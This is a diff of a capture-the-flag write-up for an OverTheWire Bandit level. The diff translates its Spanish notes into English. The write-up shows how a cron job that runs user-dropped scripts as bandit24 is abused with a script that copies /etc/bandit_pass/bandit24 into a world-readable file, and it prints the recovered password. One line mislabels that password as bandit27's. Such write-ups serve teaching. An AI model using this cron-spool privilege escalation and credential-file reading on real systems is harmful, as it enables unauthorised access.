@@ -1,4 +1,6 @@
-## Level Goal
+# Level 24
+
+### Level Info
 
 A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.
 
@@ -6,12 +8,14 @@ A program is running automatically at regular intervals from **cron**, the time-
 
 **NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
 
-## Commands you may need to solve this level
+### Commands you may need to solve this level
 
 chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)
 
 # Solution
-Primero vemos que es lo que esta haciendo la tarea cron:
+
+First, we check what the cron job is doing:
+
 ```sh
 bandit23@bandit:~$ cd /etc/cron.d
 
@@ -50,33 +54,37 @@ do
 done
 ```
 
-Este script ejecuta todos los scripts creados por bandit23 (propietario:bandit23) si este script tiene permisos de ejecución para otros (ojo). Da un tiempo de ejecución entre 9 a 60 segundos para evitar problemas de loops infinitos o errores y borra el archivo.
+This script executes all the scripts created by bandit23 (owner: bandit23) if these scripts have execution permissions for others (note). It provides a runtime between 9 to 60 seconds to avoid issues with infinite loops or errors and then deletes the file.
 
-#### Pregunta: Si lo ejecuta bandit24, tendre acceso a bandit24
-Ejemplo práctico con **whoami**:
-Si creamos un script que nos diga el usuario
+#### Question: If it is executed by bandit24, will I have access to bandit24?
+Practical example with **whoami**:
+If we create a script that tells us the current user:
+
 ```sh
 #!/bin/bash
 
 echo "$(whoami)">/tmp/tmp.O0Y51DcGYw/file_name
 chmod o+r /tmp/tmp.O0Y51DcGYw/file_name
 ```
-El resultado es tener un archivo que sea:
+What happens if we copy the file in the specific folder /var/spool/bandit24/foo/:
+
 ```sh
-# COPIAMOS EL SCRIPT AL DIRECTORIO QUE EJECUTA LOS SCRIPTS
+# WE COPY THE SCRIPT TO THE DIRECTORY WHERE THE SCRIPTS ARE EXECUTED
 bandit23@bandit:/tmp/tmp.O0Y51DcGYw$ cp script.sh /var/spool/bandit24/foo/
 bandit23@bandit:/tmp/tmp.O0Y51DcGYw$ watch -n 1 ls -l
 bandit23@bandit:/tmp/tmp.O0Y51DcGYw$ cat file_name
 bandit24
 ```
-Con el siguiente script nos copiaremos la password de bandit27:
+
+With the following script, we will copy the password for bandit27:
+
 ```sh
 #!/bin/bash
 
 cat /etc/bandit_pass/bandit24>/tmp/tmp.O0Y51DcGYw/pass_24.log
 chmod o+r /tmp/tmp.O0Y51DcGYw/pass_24.log
 ```
-Y el resultado es:
+And the result is:
 ```sh
 bandit23@bandit:/tmp/tmp.O0Y51DcGYw$ cp script.sh /var/spool/bandit24/foo/
 bandit23@bandit:/tmp/tmp.O0Y51DcGYw$ watch -n 1 ls -l
@@ -84,9 +92,6 @@ bandit23@bandit:/tmp/tmp.O0Y51DcGYw$ cat pass_24.log
 gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
 ```
 
-# Password next level:
+# Password for level 25:
 
 gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
-
-## Next level:
-[[Level 24 -> 25]]
